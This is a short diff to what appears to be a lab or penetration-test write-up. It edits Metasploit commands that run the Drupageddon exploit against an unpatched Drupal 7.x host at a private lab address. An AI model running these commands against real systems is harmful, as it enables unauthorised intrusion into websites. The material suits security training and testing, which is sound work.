@@ -76,9 +76,10 @@ The target CMS was identified as an unpatched Drupal 7.x installation susceptibl
 
 ```bash
 msfconsole
+search drupal
 use exploit/multi/http/drupal_drupageddon
+show options
 set RHOSTS 10.0.2.6
-set RPORT 80
 exploit
 ```
 
